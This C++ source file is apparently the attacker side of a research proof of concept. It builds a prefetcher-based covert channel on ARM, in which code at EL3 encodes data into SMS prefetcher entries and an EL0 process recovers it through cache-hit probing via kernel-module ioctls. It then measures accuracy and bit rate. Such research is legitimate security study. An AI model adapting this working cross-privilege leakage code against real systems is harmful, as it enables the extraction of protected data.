#include "attacker.hh"
#include <sched.h>

static int cache_dev_fd;
static int smc_dev_fd;

// Kernel ioctl calls
void ioctl_setup(struct cache_request_setup* setup_ptr)
{
	int res = ioctl(cache_dev_fd, IOCTL_SETUP, setup_ptr);
	if (res != 0) {
		exit(-1);
	}
	puts("setup done.");
}

void ioctl_query(enum cache_level level)
{
	int res = ioctl(cache_dev_fd, IOCTL_QUERY, level);
	if (res != 0) {
		exit(-1);
	}
}

void ioctl_trigger(int id)
{
	int res = ioctl(smc_dev_fd, id);
	if (res != 0) {
		exit(-1);
	}
}

void setup (Mapping &pa, Mapping &cache_hits)
{
	// move to CPU
	#ifdef CORE_SAME
		move_process_to_cpu(getpid(), 4);
	#elif defined(CORE_DIFFERENT)
		move_process_to_cpu(getpid(), 2);
	#endif

	// set up ioctl
	// allocate probe array
	pa = allocate_mapping(MAPPING_SIZE);

	// allocate sufficient memory for query responses
	cache_hits = allocate_mapping(NUM_LINES_L2 + 1 * sizeof(size_t));
	
	// prepare a setup struct (to be sent to the kernel module)
	pid_t my_pid = getpid();
	struct cache_request_setup setup = {
		.pid = my_pid,
		.pa_base_addr = pa.base_addr,
		.pa_size = pa.size,
		//.resp_l1 = (size_t*)resp_l1.base_addr,
		//.resp_l1_size = resp_l1.size,
		.resp_l1 = NULL,
		.resp_l1_size = 0,
		.resp_l2 = (size_t*)cache_hits.base_addr,
    	.resp_l2_size = cache_hits.size
	};

	// open device file for communication with the cache kernel module
	cache_dev_fd = open(CACHE_DEVICE_FILE_PATH, 0);
	if (cache_dev_fd < 0) {
		debug_print ("Can't open device file: %s\n", CACHE_DEVICE_FILE_PATH);
		perror("");
		exit(-1);
	}
	// open device file for communication with the smc kernel module
	smc_dev_fd = open(SMC_DEVICE_FILE_PATH, 0);
	if (smc_dev_fd < 0) {
		debug_print ("Can't open device file: %s\n", SMC_DEVICE_FILE_PATH);
		perror("");
		exit(-1);
	}

	// send setup struct to kernel module
	ioctl_setup(&setup);
}

// Debug function to print all cache hits
void print_hits(enum cache_level level, Mapping resp)
{
#if DEBUG
	size_t num_hits = *((size_t*)resp.base_addr);

	for (size_t i = 1; i <= num_hits; i++) {
		size_t offset = ((size_t*)resp.base_addr)[i];

		double cache_line_offset = ((double)offset) / CACHE_LINE_WIDTH;

		debug_print(
			"L%d, offset: %6.2lf * %4u, quantity: %u\n",
			level == CACHE_L1 ? 1 : 2,
			cache_line_offset, CACHE_LINE_WIDTH, 1
		);
	}
#endif
}
void evaluate(uint8_t (&decoded_data)[TX_DATA], timespec elapsed_time)
{
	size_t error = 0;
	double estimate = elapsed_time.tv_sec + (double)elapsed_time.tv_nsec/NS_PER_SECOND;

	for (size_t j = 0; j < DATA_DUP; j++) {
		for (size_t i = 0; i < MAX_DATA; i++) {
			for (size_t k = 0; k < 7; k++) {
				if ((decoded_data[i+j*MAX_DATA] & (1<<k)) != (secret[i] & (1<<k))){
					error++;
				}
			}
		}
	}

	printf("1. Accuracy:\n");
	printf("Total_RX_bytes: %d Bytes\n\tError_bytes: %zu Bits\n\tPercent_error:%f%% \n\n", TX_DATA, error, ((float)error/(TX_DATA*8))*100);
	printf("2. Performance:\n");
	printf("Total_RX_bytes: 1MBytes\n\tTotal_time:%f sec\n\tbit_rate:%f bytes/sec\n", estimate, (1024*DATA_DUP)/estimate);
}

void postprocess(data_t &data, uint8_t (&decoded_data)[TX_DATA])
{
	int max_freq = 0;

	for (size_t i = 0; i < TX_DATA; i++) {
		std::map<int, int> freq_map;
		for (size_t j = 0; j < MAX_RETRY; j++) {
			uint8_t x = data.data[i][j];
			int f = ++freq_map[x];
			//if (x<0x20 || x>0x7d) continue;
			if (f > max_freq) {
				max_freq = f;
				decoded_data[i] = x;
			}
		}
		max_freq = 0;
	}

	printf("===============================================\n");
	for (int i = 0; i < MAX_DATA; i++) {
		printf("%c", decoded_data[i]);
	}
	printf("\n");
}

void get_payload(Mapping resp, uint32_t entry, size_t rep, data_t &data)
{
	size_t num_hits = *((size_t*)resp.base_addr);
	uint8_t c[PATTERN_SIZE] = {0};

	// Decode cache line hit pattern into data
	for (size_t i = 1; i <= num_hits; i++) {
		int offset = ((size_t*)resp.base_addr)[i]/CACHE_LINE_WIDTH - (entry * (MAPPING_SIZE/SMS_ENTRIES)/CACHE_LINE_WIDTH);
		// ignore pattern not for the corresponding entry
		if ((offset < 0) || (offset >  REGION_SIZE/CACHE_LINE_WIDTH)) {
			continue;
		}

		// debug_print("offset: %d \n", offset);
		if (offset < TRIGGER_OFFSET) {
			c[0] |= 1 << offset;
		} 
		if (offset > TRIGGER_OFFSET) {
			c[1] |= 1 << (offset - (TRIGGER_OFFSET + 1));
		}
	}
	data.data[data.seq + entry*2][rep] = c[0]; 
	data.data[data.seq + entry*2+1][rep] = c[1]; 

	debug_print("%x, %x : %c %c\n", c[0], c[1],c[0], c[1]);
}

/**
 * Collects the covert channel data from EL3.
 * It signals the EL3 to encode the data as a pattern into multiple entries of the SMS prefetcher.
 * Later read these patterns by triggering the same prefetcher entry. And finally decode the data.
 *
 * @param[in]	pa		Probe array
 * @param[in]	cache_hits	array of prefetched cache lines
 * @param[out]	data		decoded data and current seq number
 *
 */
void get_data(Mapping pa, Mapping cache_hits, data_t &data) {
	//char rcv[PAYLOAD_SIZE][MAX_RETRY] = {0}; 

	// Collect muliple instances of the payload to reduce error rate
	for (size_t repetition = 0; repetition < MAX_RETRY; repetition++) {
		debug_print ("\n=============== i=%zu =========================================\n", repetition);
		// flush the probe array
		for (size_t offset = 0; offset < pa.size; offset += CACHE_LINE_WIDTH) {
			flush(pa.base_addr + offset);
		}
		mfence();

		// Request: induce patternn by training the prefetcher in EL3
		ioctl_trigger(SMC_IOCTL_INDUCE_PATTERN);
		mfence();
		
		// Probing: perform another load request (in EL0) that picks up
		// the previous sequence in EL3
		for (int i = 0; i < SMS_ENTRIES; i++) {
			aligned_access_array[i](pa.base_addr + (i * (MAPPING_SIZE/SMS_ENTRIES))
						+ (TRIGGER_OFFSET * CACHE_LINE_WIDTH));
		}
		print_hits(CACHE_L2, cache_hits);

		// Decode: from cache hits to data
		for (int i = 0; i < SMS_ENTRIES; i++) {
			get_payload(cache_hits, i, repetition, data);
		}
	}
	debug_print("seq:%ld\n",data.seq);
	for (int i = 0; i < PAYLOAD_SIZE; i++) {
		for (int j = 0; j < MAX_RETRY; j++) {
			debug_print("%c ", data.data[data.seq + i][j]);
		}
		debug_print("\n");
	}
	debug_print("\n");
}


int main(int argc, char* argv[]) {
	Mapping pa, cache_hits;
	data_t data;
	uint8_t decoded_data[TX_DATA];
	timespec start, end, elapsed_time;

	// Setup: allocate mem, intialize kernel module communication
	setup (pa, cache_hits);

	clock_gettime(CLOCK_MONOTONIC, &start);
	// fetch the data 1024 times to tranfer 1MB data
	// Attack: trigger, collect and decode prefetcher leaked data
	for (data.seq = 0; data.seq < TX_DATA; data.seq += PAYLOAD_SIZE) {
		get_data(pa, cache_hits, data);
	}
	clock_gettime(CLOCK_MONOTONIC, &end);
	time_diff(start, end, &elapsed_time);

	// Process: process the leaked data
	postprocess(data, decoded_data);

	// Evaluate: the accuracy
	evaluate(decoded_data, elapsed_time);
	return 0;
}
